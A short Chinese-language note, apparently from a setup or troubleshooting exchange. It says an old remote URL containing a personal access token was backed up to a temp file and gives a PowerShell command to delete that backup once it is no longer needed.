另外：旧 URL（含 PAT）备份在 `%TEMP%\dsh-mobile-origin-url.bak`。**确认不再需要后请删掉它**：

```powershell
Remove-Item $env:TEMP\dsh-mobile-origin-url.bak -Force
```
